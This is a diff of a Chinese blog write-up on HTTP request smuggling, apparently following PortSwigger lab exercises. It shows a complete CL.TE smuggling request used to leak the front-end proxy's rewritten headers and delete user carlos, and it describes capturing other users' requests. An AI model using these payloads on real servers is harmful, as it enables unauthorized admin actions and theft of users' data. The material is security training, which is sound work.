@@ -551,8 +551,62 @@ Host: localhost\r\n</code></pre>
 <p><img src="%E5%AD%A6%E4%B9%A0HTTP-Smuggling-%E6%94%BB%E5%87%BB/screenshot%2025.png" alt="screenshot 25"></p>
 <p><strong>❗️修改<code>Content-Length: 4</code>之后反复请求直到走私成功(千万不要忘了)</strong></p>
 <p><img src="%E5%AD%A6%E4%B9%A0HTTP-Smuggling-%E6%94%BB%E5%87%BB/screenshot%2024.png" alt="screenshot 24"></p>
-<p>执行<code>/admin/delete?username=carlos</code>时虽然无法从结果中判断是否成功，但可以通过再次访问<code>/admin</code>得知成功与否</p>
+<p>执行<code>/admin/delete?username=carlos</code>后可以通过再次访问<code>/admin</code>得知成功与否</p>
 <p><img src="%E5%AD%A6%E4%B9%A0HTTP-Smuggling-%E6%94%BB%E5%87%BB/screenshot%2026.png" alt="screenshot 26"></p>
+<h2 id="获取前端服务器重写请求字段"><a href="#获取前端服务器重写请求字段" class="headerlink" title="获取前端服务器重写请求字段"></a>获取前端服务器重写请求字段</h2><p><strong>❗️在有的网络环境下，前端代理服务器收到请求后，不会直接转发给后端服务器，而是先[添加一些必要字段]，然后再转发给后端服务器</strong></p>
+<p><strong>👇这些字段是后端服务器对请求进行处理所必须的</strong></p>
+<ul>
+<li>描述TLS连接所使用的协议和密码</li>
+<li>包含用户IP地址的XFF头</li>
+<li>用户的会话令牌ID</li>
+</ul>
+<p>总之如果不能获取到代理服务器添加或者重写的字段，走私过去的请求就不能被后端服务器进行正确的处理</p>
+<p><strong>❓那么该如何获取这些值</strong></p>
+<p><code>PortSwigger</code>提供一种很简单的方法</p>
+<ol>
+<li>找能够将请求参数的值输出到响应中的POST请求</li>
+<li>把该POST请求中的请求参数放在走私内容的后面</li>
+<li>走私请求后直接发送若干普通请求，前端服务器对请求重写的一些字段就会显示</li>
+</ol>
+<p>👇<a href="https://portswigger.net/web-security/request-smuggling/exploiting/lab-reveal-front-end-request-rewriting" target="_blank" rel="noopener">实验</a>的最终目的还是删除用户carlos</p>
+<p>首先找到能够将请求参数的值输出到响应中的POST请求</p>
+<p><img src="%E5%AD%A6%E4%B9%A0HTTP-Smuggling-%E6%94%BB%E5%87%BB/screenshot%2027.png" alt="screenshot 27"></p>
+<p>构造含指定请求参数的数据包</p>
+<pre><code>POST / HTTP/1.1
+Host: ac8e1f861ef1fddb805e4d54000c0049.web-security-academy.net
+Connection: close
+Content-Length: 67
+Upgrade-Insecure-Requests: 1
+User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_5) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/85.0.4183.102 Safari/537.36
+Origin: https://ac8e1f861ef1fddb805e4d54000c0049.web-security-academy.net
+Content-Type: application/x-www-form-urlencoded
+Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9
+Referer: https://ac8e1f861ef1fddb805e4d54000c0049.web-security-academy.net/
+Accept-Encoding: gzip, deflate
+Accept-Language: zh-CN,zh;q=0.9,en-US;q=0.8,en;q=0.7
+Cookie: session=h6efEOfcQTYX7vEbFR17fikGnKauPlLW
+Transfer-Encoding: chunked
+
+0
+    👈 此处一定要有两个空行
+
+POST / HTTP/1.1 👈 注意此时请求方法为POST，如果是GET就无法成功传参
+Content-Length: 500
+
+search=0xGeekCat
+</code></pre>
+<p><strong>多次请求</strong>之后就可以获得前端服务器添加的请求头</p>
+<p><img src="%E5%AD%A6%E4%B9%A0HTTP-Smuggling-%E6%94%BB%E5%87%BB/screenshot%2028.png" alt="screenshot 28"></p>
+<p><strong>❓但为什么要多次请求呢，Content-Length又为什么要设置那么大呢</strong></p>
+<p>本人在复现时将<code>Content-Length</code>的值设置为500，显然之后携带的数据的长度是不够500，因此后端服务器在接收到这个走私的请求后，会认为请求还没传输完毕，继续等待请求传输</p>
+<p>继续发送相同的数据包，当接收的数据的总长度到达500时，后端服务器才认为请求已经传输完毕，然后进行响应。而在这个前端服务器向后端服务器多次请求的过程中就会发生前端服务器重写新的头字段，这个经过重写的请求会拼接在<code>search=0xGeekCat</code>后面一同传输给后端服务器，而后端会将拼接的请求作为<code>search</code>的参数进行处理，并最终回显到响应中</p>
+<p><strong>在走私的请求上添加<code>X-gtPjsV-Ip</code>字段，之后走私删除用户的请求即可</strong></p>
+<p><img src="%E5%AD%A6%E4%B9%A0HTTP-Smuggling-%E6%94%BB%E5%87%BB/screenshot%2029.png" alt="screenshot 29"></p>
+<p><strong>carlos删除成功</strong></p>
+<p><img src="%E5%AD%A6%E4%B9%A0HTTP-Smuggling-%E6%94%BB%E5%87%BB/screenshot%2030.png" alt="screenshot 30"></p>
+<h2 id="获取其他用户的请求"><a href="#获取其他用户的请求" class="headerlink" title="获取其他用户的请求"></a>获取其他用户的请求</h2><p>👆实验中通过走私一个内容长度不够的请求来获取前端服务器添加的字段，而重写的头字段来自于后续发送的请求。换句话说，我们通过请求走私获取了走私请求之后的请求</p>
+<p><strong>❓如果在的请求走私发生后，其他用户也进行了请求会怎么办，POST请求会将获得的数据存储并展示出来嘛？</strong></p>
+<p>那么可以通过走私恶意请求，将其他用户的请求信息拼接到走私请求并存储到网站中，之后再查看这些数据就能获取到用户请求。这中方法可以用来窃取用户的敏感信息</p>
 <h1 id="reference"><a href="#reference" class="headerlink" title="reference"></a>reference</h1><p><a href="https://xz.aliyun.com/t/6878" target="_blank" rel="noopener">一篇文章带你读懂 HTTP Smuggling 攻击</a></p>
 <p><a href="https://paper.seebug.org/1048/" target="_blank" rel="noopener">协议层的攻击——HTTP请求走私</a></p>
 <p><strong>郑重感谢</strong></p>
